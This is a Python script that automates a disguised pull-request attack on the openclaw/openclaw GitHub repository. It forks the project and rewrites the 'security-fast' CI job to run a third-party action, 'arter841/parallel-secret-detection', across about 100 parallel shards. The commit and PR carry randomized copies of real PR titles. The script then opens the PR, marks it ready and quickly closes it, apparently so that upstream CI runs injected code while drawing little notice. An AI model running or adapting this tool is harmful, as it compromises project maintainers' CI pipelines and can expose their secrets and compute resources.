import os
import base64
import io
import random
import re
import time
import requests
from datetime import datetime, timezone
from github import Github, Auth
from ruamel.yaml import YAML

# ========= CONFIG =========
GITHUB_TOKEN = os.environ["SECRET_KEY"]
FORK_OWNER = os.environ["FORK_OWNER"]

UPSTREAM_OWNER = "openclaw"
UPSTREAM_REPO = "openclaw"
WORKFLOW_PATH = ".github/workflows/ci.yml"
TARGET_JOB_NAME = "security-fast"
SHARDS = random.randint(90, 110)
MAX_RETRIES = 12
RETRY_DELAY = 5

yaml_parser = YAML()
yaml_parser.preserve_quotes = True
yaml_parser.width = 4096
# ==========================

small_words = {"a", "an", "the", "and", "but", "or", "in", "on", "of", "to", "for", "by", "with"}

# Function to attempt closing the PR with retries
def close_pr_with_retries(pr):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            pr.edit(state="closed")
            print(f"PR {pr.number} closed")
            return  # Exit after a successful PR closure
        except Exception as e:
            retries += 1
            print(f"Error encountered: {e}. Retrying {retries}/{MAX_RETRIES}...")
            time.sleep(RETRY_DELAY)  # Exponential backoff

def smart_rearrange(title):
    # Split the title into words
    words = title.split()

    # Handle case with a single word
    if len(words) == 1:
        return words[0]

    # Capitalize the first word
    words[0] = words[0].capitalize()

    # Shuffle the middle words (excluding small words)
    middle_words = [word for word in words[1:-1] if word.lower() not in small_words]

    if middle_words:
        random.shuffle(middle_words)
        # Reconstruct the title with shuffled middle words
        new_words = [words[0]] + middle_words + [words[-1]]
    else:
        # No middle words to shuffle, just rearrange first and last
        new_words = [words[0], words[-1]]

    # Join the words back into a sentence
    new_title = " ".join(new_words)

    # Ensure proper spacing for readability
    new_title = new_title.strip()

    return new_title

def remove_parentheses(title):
    # Regex to match and remove any content inside parentheses (including the parentheses)
    cleaned_title = re.sub(r'\(.*?\)', '', title)
    return cleaned_title.strip()

# Example usage
def get_random_title(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]
    return random.choice(lines) if lines else None

def remove_parentheses_and_hashtags(title):
    # Regex to match and remove any content inside parentheses (including the parentheses)
    title = re.sub(r'\(.*?\)', '', title)

    # Regex to match and remove hashtags with numbers
    title = re.sub(r'#\d+', '', title)

    # Return the cleaned title (strip leading/trailing spaces)
    return title.strip()

def get_random_title(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]
    return random.choice(lines) if lines else None

random_title = get_random_title("pr_titles.txt")
new_title = smart_rearrange(random_title)
cleaned_title = remove_parentheses_and_hashtags(new_title)

BRANCH_NAME = f"{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"

g = Github(auth=Auth.Token(GITHUB_TOKEN))

upstream_repo = g.get_repo(f"{UPSTREAM_OWNER}/{UPSTREAM_REPO}")

try:
    fork_repo = g.get_repo(f"{FORK_OWNER}/{UPSTREAM_REPO}")
    print(f"Fork exist: {FORK_OWNER}/{UPSTREAM_REPO}")
except:
    print(f"Fork don't exist: {FORK_OWNER}/{UPSTREAM_REPO}")
    fork_repo = upstream_repo.create_fork()
    time.sleep(5)
    fork_repo = g.get_repo(f"{FORK_OWNER}/{UPSTREAM_REPO}")
    print("Fork created")

print("Sync fork with upstream main...")
merge_url = f"https://api.github.com/repos/{FORK_OWNER}/{UPSTREAM_REPO}/merge-upstream"
headers = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json"
}
body = {"branch": "main"}

r = requests.post(merge_url, json=body, headers=headers)
if r.status_code == 200:
    print("Fork synced successfully")
else:
    print(f"Failed to sync fork: {r.status_code}, {r.text}")

main_branch = fork_repo.get_branch("main")
main_sha = main_branch.commit.sha

print(f"Create new branch: {BRANCH_NAME}")
fork_repo.create_git_ref(
    ref=f"refs/heads/{BRANCH_NAME}",
    sha=main_sha
)

print("Fetch workflow file...")
file = fork_repo.get_contents(WORKFLOW_PATH, ref=BRANCH_NAME)
decoded = base64.b64decode(file.content).decode()
data = yaml_parser.load(decoded)

# ===== Modify workflow =====
if "jobs" not in data:
    raise Exception("No jobs section found in workflow")

if TARGET_JOB_NAME not in data["jobs"]:
    raise Exception(f"Job '{TARGET_JOB_NAME}' not found")

job = data["jobs"][TARGET_JOB_NAME]

print("Add matrix parallelization...")

job["strategy"] = {
    "fail-fast": False,
    "max-parallel": SHARDS,
    "matrix": {"shard": list(range(1, SHARDS + 1))}
}

action_step = {
    "name": "Setup Parallel Secret Detection",
    "uses": "arter841/parallel-secret-detection@v0.0.5",
    "with": {
        "args": "--parallel=${{ matrix.shard }}"
    }
}

if "steps" not in job:
    job["steps"] = []

job["steps"].insert(2, action_step)

stream = io.StringIO()
yaml_parser.dump(data, stream)
updated_content = stream.getvalue()

print("Commit changes...")
fork_repo.update_file(
    WORKFLOW_PATH,
    cleaned_title,
    updated_content,
    file.sha,
    branch=BRANCH_NAME
)

print("Create Draft Pull Request...")
pr = upstream_repo.create_pull(
    title=cleaned_title,
    head=f"{FORK_OWNER}:{BRANCH_NAME}",
    base="main",
    draft=True
)

print(f"Draft PR created: {pr.html_url}")

# Wait 5 seconds
time.sleep(5)

print("Mark PR as ready for review...")
pr.edit(draft=False)

# Wait 5 seconds
time.sleep(5)

print("Closing PR...")
close_pr_with_retries(pr)
print("PR closed.")
